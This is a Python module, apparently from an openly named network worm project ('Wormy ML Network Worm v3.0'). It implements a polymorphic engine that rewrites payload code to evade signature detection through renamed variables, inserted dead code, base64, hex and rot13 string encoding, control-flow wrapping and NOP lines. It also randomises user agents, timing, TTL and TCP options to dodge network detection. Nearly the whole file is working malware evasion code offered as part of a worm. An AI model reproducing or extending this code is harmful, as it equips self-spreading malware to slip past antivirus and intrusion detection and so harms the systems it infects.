"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Polymorphic Engine
Payload mutation, code obfuscation, and network signature evasion
"""


import base64
import hashlib
import os
import random
import string
import sys
from typing import Dict, List, Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger


class PolymorphicEngine:
    """
    Polymorphic Engine for payload mutation and evasion

    Techniques:
    - Variable name randomization
    - Control flow obfuscation
    - String encoding/encryption
    - NOP insertion
    - Code reordering
    - Network signature mutation
    - Timing randomization
    """

    def __init__(self, mutation_level: int = 2):
        self.mutation_level = mutation_level
        self._mutation_cache = {}
        self.stats = {
            "mutations_generated": 0,
            "unique_signatures": 0,
            "by_technique": {},
        }

    def mutate_payload(self, payload: str, target_hash: str = None) -> str:
        """
        Mutate a payload to change its signature

        Args:
            payload: Original payload string
            target_hash: Optional target hash to avoid

        Returns:
            Mutated payload
        """
        mutated = self._apply_mutation(payload)

        if target_hash:
            payload_hash = hashlib.md5(mutated.encode()).hexdigest()
            if payload_hash == target_hash:
                mutated = self._apply_mutation(mutated)

        self.stats["mutations_generated"] += 1
        self.stats["unique_signatures"] += 1

        return mutated

    def _apply_mutation(self, code: str) -> str:
        """Apply mutation techniques to code"""
        mutated = code

        if self.mutation_level >= 1:
            mutated = self._randomize_variables(mutated)

        if self.mutation_level >= 2:
            mutated = self._insert_dead_code(mutated)
            mutated = self._encode_strings(mutated)

        if self.mutation_level >= 3:
            mutated = self._control_flow_flatten(mutated)
            mutated = self._add_nop_equivalents(mutated)

        return mutated

    def _randomize_variables(self, code: str) -> str:
        """Randomize variable names"""
        import re

        var_pattern = re.compile(r"\b([a-zA-Z_][a-zA-Z0-9_]*)\b")
        common_vars = {
            "import",
            "from",
            "def",
            "class",
            "return",
            "if",
            "else",
            "for",
            "while",
            "try",
            "except",
            "with",
            "as",
            "in",
            "not",
            "and",
            "or",
            "True",
            "False",
            "None",
            "self",
            "print",
            "len",
            "range",
            "str",
            "int",
            "float",
            "list",
            "dict",
            "open",
            "close",
            "read",
            "write",
            "append",
            "join",
            "split",
            "socket",
            "connect",
            "send",
            "recv",
            "bind",
            "listen",
            "logger",
            "time",
            "os",
            "sys",
            "random",
            "hashlib",
            "base64",
            "json",
            "requests",
            "paramiko",
        }

        var_map = {}

        def replace_var(match):
            var = match.group(1)
            if var in common_vars:
                return var
            if var not in var_map:
                var_map[var] = self._generate_var_name()
            return var_map[var]

        return var_pattern.sub(replace_var, code)

    def _generate_var_name(self) -> str:
        """Generate a random variable name"""
        prefix = random.choice(["_", "__", "var_", "tmp_", "x_", "data_"])
        suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return f"{prefix}{suffix}"

    def _insert_dead_code(self, code: str) -> str:
        """Insert dead code (code that doesn't affect execution)"""
        dead_code_snippets = [
            f"_unused_{random.randint(1000, 9999)} = {random.randint(1, 100)}\n",
            f"# Optimization level {random.randint(1, 5)}\n",
            f"_temp_calc = {random.randint(1, 100)} * {random.randint(1, 100)}\n",
            f"_debug_flag = {random.choice([True, False])}\n",
            f"_padding_{random.randint(1, 999)} = '{''.join(random.choices(string.ascii_letters, k=16))}'\n",
        ]

        lines = code.split("\n")
        num_inserts = min(3, max(1, len(lines) // 5))
        if len(lines) <= 1:
            insert_positions = [0]
        else:
            insert_positions = random.sample(range(1, len(lines)), min(num_inserts, len(lines) - 1))

        for pos in sorted(insert_positions, reverse=True):
            dead_code = random.choice(dead_code_snippets)
            lines.insert(pos, dead_code.rstrip())

        return "\n".join(lines)

    def _encode_strings(self, code: str) -> str:
        """Encode string literals"""
        import re

        def encode_string(match):
            original = match.group(1)
            if len(original) < 4:
                return match.group(0)

            encoding = random.choice(["base64", "hex", "rot13"])

            if encoding == "base64":
                encoded = base64.b64encode(original.encode()).decode()
                return f"__import__('base64').b64decode('{encoded}').decode()"
            elif encoding == "hex":
                encoded = original.encode().hex()
                return f"bytes.fromhex('{encoded}').decode()"
            else:
                import codecs

                encoded = codecs.encode(original, "rot_13")
                return f"__import__('codecs').decode('{encoded}', 'rot_13')"

        return re.sub(r"'([^']*)'", encode_string, code)

    def _control_flow_flatten(self, code: str) -> str:
        """Add control flow flattening"""
        lines = code.split("\n")
        if len(lines) < 5:
            return code

        wrapper = [
            f"_cf_state = {random.randint(0, 999)}",
            "while _cf_state >= 0:",
            "    if _cf_state == 0:",
        ]

        indented_lines = ["        " + line for line in lines]
        wrapper.extend(indented_lines)
        wrapper.append("        _cf_state = -1")
        wrapper.append("    else:")
        wrapper.append("        break")

        return "\n".join(wrapper)

    def _add_nop_equivalents(self, code: str) -> str:
        """Add NOP-equivalent instructions"""
        nops = [
            "pass  # nop",
            "True and None  # nop",
            "0 or 1  # nop",
            "'' or 'x'  # nop",
            "[] + []  # nop",
        ]

        lines = code.split("\n")
        insert_count = min(5, len(lines) // 3)

        for _ in range(insert_count):
            pos = random.randint(0, len(lines) - 1)
            lines.insert(pos, random.choice(nops))

        return "\n".join(lines)

    def mutate_network_signature(self) -> Dict:
        """Generate network signature mutations"""
        return {
            "user_agent": self._random_user_agent(),
            "jitter": random.uniform(0.1, 2.0),
            "packet_size": random.randint(64, 1500),
            "ttl": random.choice([64, 128, 255]),
            "window_size": random.choice([8192, 16384, 32768, 65535]),
            "tcp_options": random.choice(
                [
                    "MSS,WS,SACK",
                    "MSS,WS",
                    "MSS,SACK",
                    "WS,SACK",
                    "MSS",
                ]
            ),
        }

    def _random_user_agent(self) -> str:
        """Generate random user agent string"""
        browsers = [
            f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90, 120)}.0.0.0 Safari/537.36",
            f"Mozilla/5.0 (X11; Linux x86_64; rv:{random.randint(80, 110)}.0) Gecko/20100101 Firefox/{random.randint(80, 110)}.0",
            f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{random.randint(12, 15)}_{random.randint(0, 7)}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{random.randint(14, 17)}.0 Safari/605.1.15",
            f"python-requests/{random.randint(2, 3)}.{random.randint(0, 9)}.{random.randint(0, 9)}",
            f"curl/{random.randint(7, 8)}.{random.randint(0, 9)}.{random.randint(0, 9)}",
        ]
        return random.choice(browsers)

    def get_timing_delay(self, base_delay: float = 1.0) -> float:
        """Calculate randomized timing delay"""
        jitter = random.uniform(0.5, 2.0)
        return base_delay * jitter

    def get_statistics(self) -> Dict:
        """Get polymorphic engine statistics"""
        return {
            **self.stats,
            "mutation_level": self.mutation_level,
        }
